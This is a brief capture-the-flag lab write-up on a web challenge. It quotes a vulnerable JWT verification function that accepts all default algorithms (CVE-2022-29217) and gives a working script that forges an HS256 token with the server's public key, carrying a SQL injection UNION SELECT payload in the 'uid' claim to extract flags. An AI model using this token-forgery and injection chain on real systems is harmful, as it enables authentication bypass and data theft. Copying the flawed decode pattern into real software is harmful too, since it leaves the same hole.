- recon
    - the website is vulnerable to SQLi in `uid` parameter . ![image](https://hackmd.io/_uploads/BkPt-jK-fx.png)
    - the `_verify_and_decode_eddsa` function have flaw . The line `algorithms=jwt.algorithms.get_default_algorithms()` configures the application to accept any default JWT algorithm. An attacker can abuse this behavior via a Key Confusion attack: they sign the token using a symmetric algorithm (`HS256/384/512`) but with the server's public key. Consequently, `jwt.decode()` treats the public key as a shared HMAC secret key during verification, allowing the attacker to bypass authentication.
```
def _verify_and_decode_eddsa(token):
    if not token:
        raise InvalidTokenError("missing token")
    header_b64 = token.split('.')[0]
    padding = '=' * (-len(header_b64) % 4)
    header_bytes = base64.urlsafe_b64decode(header_b64 + padding)
    header = json.loads(header_bytes)
    alg = header.get("alg", "EdDSA")
    pubkey = read_key(PUBLIC_KEY_PATH)
    if isinstance(pubkey, bytes):
        pubkey = pubkey.decode("utf-8")
    return jwt.decode(token, key=pubkey, algorithms=jwt.algorithms.get_default_algorithms())
```
- public keey in `/static/ed25519_public.pub`
- this lab use jwt version `2.3.0` has `CVE-2022-29217`
- script:
```
import jwt, time
now = int(time.time())
malicious_payload = {
    "uid": "1 UNION SELECT id, value FROM flags --",
    "uname": "guest",
    "iat": now,
    "exp": now + 3600
}
pub_key_as_secret = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5Fa9hY9pVW5s9z4EpCWoPxrNNX4fkJ6tjZ8pvvL6g/"
forged_token = jwt.encode(malicious_payload, pub_key_as_secret, algorithm="HS256")
print("TOKEN_CUA_BAN:", forged_token)

```
![image](https://hackmd.io/_uploads/HkgVw3YWze.png)